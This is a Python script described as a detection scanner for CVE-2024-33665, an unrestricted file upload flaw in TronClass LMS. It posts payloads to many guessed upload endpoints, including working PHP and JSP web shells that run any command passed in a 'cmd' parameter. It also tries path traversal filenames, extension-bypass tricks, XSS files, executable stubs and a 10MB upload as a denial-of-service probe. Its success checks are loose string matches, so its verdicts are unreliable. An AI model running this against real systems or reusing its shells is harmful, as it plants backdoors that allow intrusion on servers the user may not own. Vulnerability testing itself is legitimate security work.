"""
CVE-2024-33665 Vulnerability Detection Script
File Upload vulnerability detection for TronClass LMS
"""

import requests
import os
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2024-33665 vulnerability
    Unrestricted file upload vulnerability
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-33665: Unrestricted file upload vulnerability allowing malicious file execution',
        'remediation': 'Implement file type validation, size limits, and store uploads outside web root. Use virus scanning.'
    }
    
    try:
        # File upload test endpoints
        upload_endpoints = [
            '/upload',
            '/file/upload',
            '/media/upload',
            '/content/upload',
            '/assignment/upload',
            '/profile/upload',
            '/course/upload',
            '/api/upload',
            '/admin/upload'
        ]
        
        # Malicious file payloads
        malicious_files = [
            ('shell.php', '<?php echo "vulnerable"; system($_GET["cmd"]); ?>', 'application/x-php'),
            ('shell.jsp', '<% out.println("vulnerable"); Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'application/x-jsp'),
            ('shell.asp', '<%response.write("vulnerable")%>', 'application/x-asp'),
            ('shell.aspx', '<%@ Page Language="C#" %><%Response.Write("vulnerable");%>', 'application/x-aspx'),
            ('test.html', '<script>alert("XSS")</script>', 'text/html'),
            ('test.svg', '<svg onload=alert("XSS")></svg>', 'image/svg+xml'),
            ('test.phtml', '<?php echo "vulnerable"; ?>', 'application/x-httpd-php'),
            ('test.php5', '<?php echo "vulnerable"; ?>', 'application/x-php')
        ]
        
        # Test each upload endpoint
        for endpoint in upload_endpoints:
            try:
                # Test if endpoint exists
                response = session.get(urljoin(target_url, endpoint), timeout=30)
                if response.status_code == 404:
                    continue
                
                # Test malicious file uploads
                for filename, content, mime_type in malicious_files:
                    try:
                        files = {'file': (filename, content, mime_type)}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            files=files,
                            timeout=30
                        )
                        
                        # Check for successful upload indicators
                        success_indicators = [
                            'upload successful',
                            'file uploaded',
                            'successfully uploaded',
                            'upload complete',
                            'file saved',
                            'uploaded successfully'
                        ]
                        
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in success_indicators):
                            result['vulnerable'] = True
                            result['evidence'] = f"Malicious file {filename} uploaded successfully to {endpoint}"
                            return result
                        
                        # Check if response contains file path or URL
                        if 'uploads/' in response_text or 'files/' in response_text:
                            result['vulnerable'] = True
                            result['evidence'] = f"File upload vulnerability detected at {endpoint} - uploaded {filename}"
                            return result
                            
                    except:
                        continue
                        
            except:
                continue
        
        # Test for directory traversal in file uploads
        traversal_files = [
            ('../../shell.php', '<?php echo "vulnerable"; ?>', 'application/x-php'),
            ('../../../shell.php', '<?php echo "vulnerable"; ?>', 'application/x-php'),
            ('..\\..\\shell.php', '<?php echo "vulnerable"; ?>', 'application/x-php')
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, mime_type in traversal_files:
                try:
                    files = {'file': (filename, content, mime_type)}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        files=files,
                        timeout=30
                    )
                    
                    if 'uploaded' in response.text.lower() or 'success' in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"Directory traversal file upload vulnerability at {endpoint} with filename: {filename}"
                        return result
                except:
                    continue
        
        # Test for file extension bypass techniques
        bypass_files = [
            ('shell.php.jpg', '<?php echo "vulnerable"; ?>', 'image/jpeg'),
            ('shell.php%00.jpg', '<?php echo "vulnerable"; ?>', 'image/jpeg'),
            ('shell.php;.jpg', '<?php echo "vulnerable"; ?>', 'image/jpeg'),
            ('shell.PhP', '<?php echo "vulnerable"; ?>', 'application/x-php'),
            ('shell.php5', '<?php echo "vulnerable"; ?>', 'application/x-php'),
            ('shell.phtml', '<?php echo "vulnerable"; ?>', 'application/x-php')
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, mime_type in bypass_files:
                try:
                    files = {'file': (filename, content, mime_type)}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        files=files,
                        timeout=30
                    )
                    
                    if 'uploaded' in response.text.lower() or 'success' in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"File extension bypass vulnerability at {endpoint} with filename: {filename}"
                        return result
                except:
                    continue
        
        # Test for oversized file uploads (DoS)
        try:
            large_content = 'A' * (10 * 1024 * 1024)  # 10MB
            files = {'file': ('large.txt', large_content, 'text/plain')}
            response = session.post(
                urljoin(target_url, '/upload'),
                files=files,
                timeout=60
            )
            
            if response.status_code == 200 and 'uploaded' in response.text.lower():
                result['vulnerable'] = True
                result['evidence'] = "Large file upload accepted - potential DoS vulnerability"
                return result
        except:
            pass
        
        # Test for executable file uploads
        executable_files = [
            ('test.exe', 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff', 'application/x-msdownload'),
            ('test.bat', '@echo off\necho vulnerable', 'application/x-bat'),
            ('test.sh', '#!/bin/bash\necho vulnerable', 'application/x-sh')
        ]
        
        for endpoint in upload_endpoints:
            for filename, content, mime_type in executable_files:
                try:
                    files = {'file': (filename, content, mime_type)}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        files=files,
                        timeout=30
                    )
                    
                    if 'uploaded' in response.text.lower() or 'success' in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = f"Executable file upload vulnerability at {endpoint} with filename: {filename}"
                        return result
                except:
                    continue
                    
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result